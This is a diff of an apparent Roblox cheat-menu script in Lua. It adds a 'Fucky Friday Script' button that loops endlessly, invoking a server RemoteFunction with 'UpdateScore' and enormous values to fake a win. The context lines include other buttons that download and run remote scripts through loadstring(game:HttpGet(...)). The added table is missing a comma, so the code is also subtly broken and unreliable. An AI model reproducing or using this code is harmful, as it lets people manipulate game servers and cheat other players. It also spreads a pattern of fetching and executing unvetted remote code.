@@ -81,6 +81,26 @@ end)
      MainSection:NewButton("INFINITE YIELD", "It has much commands", function()
      loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
      end)
+          MainSection:NewButton("Fucky Friday Script", "Always Win", function()
+     while wait() do
+while wait() do
+
+local A_1 = 
+{
+	[1] = "Server", 
+	[2] = "SongManager", 
+	[3] = "UpdateScore"
+}
+local A_2 = 
+{
+	[1] = 100000000000000000000000000
+	[3] = 100000000000000000000000000
+}
+local Event = game:GetService("ReplicatedStorage").RF
+Event:InvokeServer(A_1, A_2)
+end
+end
+end)
      MainSection:NewButton("MurderMystery2 Script", "MurderMystery2 Script", function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Doggo-cryto/EclipseMM2/master/Script", true))()
      end)
